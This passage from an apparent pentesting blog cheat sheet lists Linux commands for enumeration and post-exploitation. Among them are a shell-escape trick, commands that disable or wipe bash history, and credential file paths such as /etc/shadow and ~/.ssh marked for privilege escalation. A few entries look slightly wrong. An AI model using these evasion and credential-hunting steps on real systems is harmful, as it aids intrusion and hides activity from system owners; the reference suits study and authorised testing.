this content will be constantly updated as I discover new awesomeness.</p> \n<h2 id=\"linux-penetration-testing-commands\">Linux Penetration Testing Commands</h2> \n<p>The commands listed below are designed for local enumeration, typical commands a penetration tester would use during post exploitation or when performing command injection etc. See our pen test cheat sheet for an in depth list of <a href=\"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\">pen testing tool commands</a> and example usage.</p> \n<h3 id=\"linux-network-commands\">Linux Network Commands</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>netstat -tulpn</code></p> </td> \n    <td> <p> Show Linux network ports with process ID's (PIDs) </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>watch ss -stplu</code></p> </td> \n    <td> <p> Watch TCP, UDP open ports in real time with socket summary. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>lsof -i</code></p> </td> \n    <td> <p> Show established connections. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>macchanger -m MACADDR INTR</code></p> </td> \n    <td> <p> Change MAC address on KALI Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>ifconfig eth0 192.168.2.1/24</code></p> </td> \n    <td> <p> Set IP address in Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>ifconfig eth0:1 192.168.2.3/24</code></p> </td> \n    <td> <p> Add IP address to existing network interface in Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>ifconfig eth0 hw ether MACADDR</code></p> </td> \n    <td> <p> Change MAC address in Linux using ifconfig. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>ifconfig eth0 mtu 1500</code></p> </td> \n    <td> <p> Change MTU size Linux using ifconfig, change 1500 to your desired MTU. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>dig -x 192.168.1.1 </code></p> </td> \n    <td> <p> Dig reverse lookup on an IP address. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>host 192.168.1.1 </code></p> </td> \n    <td> <p> Reverse lookup on an IP address, in case dig is not installed. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>dig @192.168.2.2 domain.com -t AXFR</code></p> </td> \n    <td> <p> Perform a DNS zone transfer using dig. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>host -l domain.com nameserver</code></p> </td> \n    <td> <p> Perform a DNS zone transfer using host. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtstat -A x.x.x.x</code></p> </td> \n    <td> <p> Get hostname for IP address. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>ip addr add 192.168.2.22/24 dev eth0</code></p> </td> \n    <td> <p> Adds a hidden IP address to Linux, does not show up when performing an ifconfig. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tcpkill -9 host google.com</code></p> </td> \n    <td> <p> Blocks access to google.com from the host machine. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>echo \"1\" &gt; /proc/sys/net/ipv4/ip_forward</code></p> </td> \n    <td> <p> Enables IP forwarding, turns Linux box into a router - handy for routing traffic through a box. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>echo \"8.8.8.8\" &gt; /etc/resolv.conf</code></p> </td> \n    <td> <p> Use Google DNS. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"system-information-commands\">System Information Commands</h3> \n<p>Useful for local enumeration.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>whoami</code></p> </td> \n    <td> <p> Shows currently logged in user on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>id</code></p> </td> \n    <td> <p> Shows currently logged in user and groups for the user. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>last</code></p> </td> \n    <td> <p> Shows last logged in users. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>mount</code></p> </td> \n    <td> <p> Show mounted drives. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>df -h</code></p> </td> \n    <td> <p> Shows disk usage in human readable output. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>echo \"user:passwd\" | chpasswd</code></p> </td> \n    <td> <p> Reset password in one line. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>getent passwd</code></p> </td> \n    <td> <p> List users on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>strings /usr/local/bin/blah</code></p> </td> \n    <td> <p> Shows contents of none text files, e.g. whats in a binary. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>uname -ar</code></p> </td> \n    <td> <p> Shows running kernel version. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>PATH=$PATH:/my/new-path</code></p> </td> \n    <td> <p> Add a new PATH, handy for local FS manipulation. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>history</code></p> </td> \n    <td> <p> Show bash history, commands the user has entered previously. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"redhat--centos--rpm-based-distros\">Redhat / CentOS / RPM Based Distros</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>cat /etc/redhat-release</code></p> </td> \n    <td> <p> Shows Redhat / CentOS version number. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>rpm -qa</code></p> </td> \n    <td> <p> List all installed RPM's on an RPM based Linux distro. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>rpm -q --changelog openvpn</code></p> </td> \n    <td> <p> Check installed RPM is patched against CVE, grep the output for CVE. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"yum-commands\">YUM Commands</h4> \n<p>Package manager used by RPM based systems, you can pull some usefull information about installed packages and or install additional tools.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>yum update</code></p> </td> \n    <td> <p> Update all RPM packages with YUM, also shows whats out of date. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum update httpd</code></p> </td> \n    <td> <p> Update individual packages, in this example HTTPD (Apache). </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum install package</code></p> </td> \n    <td> <p> Install a package using YUM. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum --exclude=package kernel* update</code></p> </td> \n    <td> <p> Exclude a package from being updates with YUM. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum remove package</code></p> </td> \n    <td> <p> Remove package with YUM. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum erase package</code></p> </td> \n    <td> <p> Remove package with YUM. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum list package</code></p> </td> \n    <td> <p> Lists info about yum package. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum provides httpd</code></p> </td> \n    <td> <p> What a packages does, e.g Apache HTTPD Server. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum info httpd</code></p> </td> \n    <td> <p> Shows package info, architecture, version etc. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum localinstall blah.rpm</code></p> </td> \n    <td> <p> Use YUM to install local RPM, settles deps from repo. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum deplist package</code></p> </td> \n    <td> <p> Shows deps for a package. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum list installed | more</code></p> </td> \n    <td> <p> List all installed packages. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum grouplist | more</code></p> </td> \n    <td> <p> Show all YUM groups. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>yum groupinstall 'Development Tools'</code></p> </td> \n    <td> <p> Install YUM group. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"debian--ubuntu--deb-based-distros\">Debian / Ubuntu / .deb Based Distros</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>cat /etc/debian_version</code></p> </td> \n    <td> <p> Shows Debian version number. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>cat /etc/*-release</code></p> </td> \n    <td> <p> Shows Ubuntu version number. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>dpkg -l</code></p> </td> \n    <td> <p> List all installed packages on Debian / .deb based Linux distro. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-user-management\">Linux User Management</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>useradd new-user</code></p> </td> \n    <td> <p> Creates a new Linux user. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>passwd username</code></p> </td> \n    <td> <p> Reset Linux user password, enter just <code>passwd</code> if you are root. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>deluser username</code></p> </td> \n    <td> <p> Remove a Linux user. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-decompression-commands\">Linux Decompression Commands</h3> \n<p>How to extract various archives (tar, zip, gzip, bzip2 etc) on Linux and some other tricks for searching inside of archives etc.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>unzip archive.zip</code></p> </td> \n    <td> <p> Extracts zip file on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>zipgrep *.txt archive.zip</code></p> </td> \n    <td> <p> Search inside a .zip archive. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar xf archive.tar</code></p> </td> \n    <td> <p> Extract tar file Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar xvzf archive.tar.gz</code></p> </td> \n    <td> <p> Extract a tar.gz file Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar xjf archive.tar.bz2</code></p> </td> \n    <td> <p> Extract a tar.bz2 file Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar ztvf file.tar.gz | grep blah</code></p> </td> \n    <td> <p> Search inside a tar.gz file. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>gzip -d archive.gz</code></p> </td> \n    <td> <p> Extract a gzip file Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>zcat archive.gz</code></p> </td> \n    <td> <p> Read a gz file Linux without decompressing. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>zless archive.gz</code></p> </td> \n    <td> <p> Same function as the <code>less</code> command for .gz archives. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>zgrep 'blah' /var/log/maillog*.gz</code></p> </td> \n    <td> <p> Search inside .gz archives on Linux, search inside of compressed log files. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>vim file.txt.gz</code></p> </td> \n    <td> <p> Use vim to read .txt.gz files (my personal favorite). </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>upx -9 -o output.exe input.exe</code></p> </td> \n    <td> <p> UPX compress .exe file Linux. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-compression-commands\">Linux Compression Commands</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>zip -r file.zip /dir/*</code></p> </td> \n    <td> <p> Creates a .zip file on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar cf archive.tar files</code></p> </td> \n    <td> <p> Creates a tar file on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar czf archive.tar.gz files</code></p> </td> \n    <td> <p> Creates a tar.gz file on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>tar cjf archive.tar.bz2 files</code></p> </td> \n    <td> <p> Creates a tar.bz2 file on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>gzip file</code></p> </td> \n    <td> <p> Creates a file.gz file on Linux. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-file-commands\">Linux File Commands</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>df -h blah</code></p> </td> \n    <td> <p> Display size of file / dir Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>diff file1 file2</code></p> </td> \n    <td> <p> Compare / Show differences between two files on Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>md5sum file</code></p> </td> \n    <td> <p> Generate MD5SUM Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>md5sum -c blah.iso.md5</code></p> </td> \n    <td> <p> Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>file blah</code></p> </td> \n    <td> <p> Find out the type of file on Linux, also displays if file is 32 or 64 bit. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>dos2unix</code></p> </td> \n    <td> <p> Convert Windows line endings to Unix / Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>base64 &lt; input-file &gt; output-file</code></p> </td> \n    <td> <p> Base64 encodes input file and outputs a Base64 encoded file called output-file. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>base64 -d &lt; input-file &gt; output-file</code></p> </td> \n    <td> <p> Base64 decodes input file and outputs a Base64 decoded file called output-file. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>touch -r ref-file new-file</code></p> </td> \n    <td> <p> Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>rm -rf</code></p> </td> \n    <td> <p> Remove files and directories without prompting for confirmation. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"samba-commands\">Samba Commands</h3> \n<p>Connect to a Samba share from Linux.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>smbmount //server/share /mnt/win <span class=\"nt\">-o</span> <span class=\"nv\">user</span><span class=\"o\">=</span>username,password<span class=\"o\">=</span>password1\n<span class=\"nv\">$ </span>smbclient <span class=\"nt\">-U</span> user <span class=\"se\">\\\\\\\\</span>server<span class=\"se\">\\\\</span>share\n<span class=\"nv\">$ </span>mount <span class=\"nt\">-t</span> cifs <span class=\"nt\">-o</span> <span class=\"nv\">username</span><span class=\"o\">=</span>user,password<span class=\"o\">=</span>password //x.x.x.x/share /mnt/share</code></pre> \n</figure> \n<h3 id=\"breaking-out-of-limited-shells\">Breaking Out of Limited Shells</h3> \n<p>Credit to G0tmi1k for these (or wherever he stole them from!).</p> \n<p>The Python trick:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">python</span> <span class=\"o\">-</span><span class=\"n\">c</span> <span class=\"s\">'import pty;pty.spawn(\"/bin/bash\")'</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo </span>os.system<span class=\"o\">(</span><span class=\"s1\">'/bin/bash'</span><span class=\"o\">)</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">/bin/sh <span class=\"nt\">-i</span></code></pre> \n</figure> \n<h3 id=\"misc-commands\">Misc Commands</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>init 6</code></p> </td> \n    <td> <p> Reboot Linux from the command line. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>gcc -o output.c input.c</code></p> </td> \n    <td> <p> Compile C code. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>gcc -m32 -o output.c input.c</code></p> </td> \n    <td> <p> Cross compile C code, compile 32 bit binary on 64 bit Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>unset HISTORYFILE</code></p> </td> \n    <td> <p> Disable bash history logging. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>rdesktop X.X.X.X</code></p> </td> \n    <td> <p> Connect to RDP server from Linux. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>kill -9 $$</code></p> </td> \n    <td> <p> Kill current session. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>chown user:group blah</code></p> </td> \n    <td> <p> Change owner of file or dir. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>chown -R user:group blah</code></p> </td> \n    <td> <p> Change owner of file or dir and all underlying files / dirs - recersive chown. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>chmod 600 file</code></p> </td> \n    <td> <p> Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>Clear bash history:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">      <span class=\"nv\">$ </span>ssh user@X.X.X.X | <span class=\"nb\">cat</span> /dev/null <span class=\"o\">&gt;</span> ~/.bash_history\n    </code></pre> \n</figure> \n<h3 id=\"linux-file-system-permissions\">Linux File System Permissions</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Value</th> \n    <th>Meaning</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>777</code></p> </td> \n    <td> <p> <code>rwxrwxrwx</code> No restriction, global WRX any user can do anything. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>755</code></p> </td> \n    <td> <p> <code>rwxr-xr-x</code> Owner has full access, others can read and execute the file. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>700</code></p> </td> \n    <td> <p> <code>rwx------</code> Owner has full access, no one else has access. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>666</code></p> </td> \n    <td> <p> <code>rw-rw-rw-</code> All users can read and write but not execute. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>644</code></p> </td> \n    <td> <p> <code>rw-r--r--</code> Owner can read and write, everyone else can read. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>600</code></p> </td> \n    <td> <p> <code>rw-------</code> Owner can read and write, everyone else has no access. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-file-system\">Linux File System</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Directory</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/</code></p> </td> \n    <td> <p> / also know as \"slash\" or the root. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/bin</code></p> </td> \n    <td> <p> Common programs, shared by the system, the system administrator and the users. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/boot</code></p> </td> \n    <td> <p> Boot files, boot loader (grub), kernels, vmlinuz </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/dev</code></p> </td> \n    <td> <p> Contains references to system devices, files with special properties. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc</code></p> </td> \n    <td> <p> Important system config files. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/home</code></p> </td> \n    <td> <p> Home directories for system users. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/lib</code></p> </td> \n    <td> <p> Library files, includes files for all kinds of programs needed by the system and the users. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/lost+found</code></p> </td> \n    <td> <p> Files that were saved during failures are here. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/mnt</code></p> </td> \n    <td> <p> Standard mount point for external file systems. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/media</code></p> </td> \n    <td> <p> Mount point for external file systems (on some distros). </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/net</code></p> </td> \n    <td> <p> Standard mount point for entire remote file systems - nfs. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/opt</code></p> </td> \n    <td> <p> Typically contains extra and third party software. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/proc</code></p> </td> \n    <td> <p> A virtual file system containing information about system resources. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/root</code></p> </td> \n    <td> <p> root users home dir. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/sbin</code></p> </td> \n    <td> <p> Programs for use by the system and the system administrator. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/tmp</code></p> </td> \n    <td> <p> Temporary space for use by the system, cleaned upon reboot. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/usr</code></p> </td> \n    <td> <p> Programs, libraries, documentation etc. for all user-related programs. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/var</code></p> </td> \n    <td> <p> Storage for all variable files and temporary files created by users, such as log files, mail queue, print spooler. Web servers, Databases etc. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"linux-interesting-files--dirs\">Linux Interesting Files / Dir’s</h3> \n<p>Places that are worth a look if you are attempting to privilege escalate / perform post exploitation.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Directory</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/etc/passwd</code></p> </td> \n    <td> <p> Contains local Linux users. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/shadow</code></p> </td> \n    <td> <p> Contains local account password hashes. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/group</code></p> </td> \n    <td> <p> Contains local account groups. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/init.d/</code></p> </td> \n    <td> <p> Contains service init script - worth a look to see whats installed. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/hostname</code></p> </td> \n    <td> <p> System hostname. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/network/interfaces</code></p> </td> \n    <td> <p> Network interfaces. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/resolv.conf</code></p> </td> \n    <td> <p> System DNS servers. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/profile</code></p> </td> \n    <td> <p> System environment variables. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>~/.ssh/</code></p> </td> \n    <td> <p> SSH keys. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>~/.bash_history</code></p> </td> \n    <td> <p> Users bash history log. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/var/log/</code></p> </td> \n    <td> <p> Linux system log files are typically stored here. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/var/adm/</code></p> </td> \n    <td> <p> UNIX system log files are typically stored here. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/var/log/apache2/access.log</code></p> <p><code>/var/log/httpd/access.log</code></p> </td> \n    <td> <p> Apache access log file typical path. </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/etc/fstab</code></p> </td> \n    <td> <p> File system mounts. </p> </td> \n   </tr> \n  </tbody> \n </table>
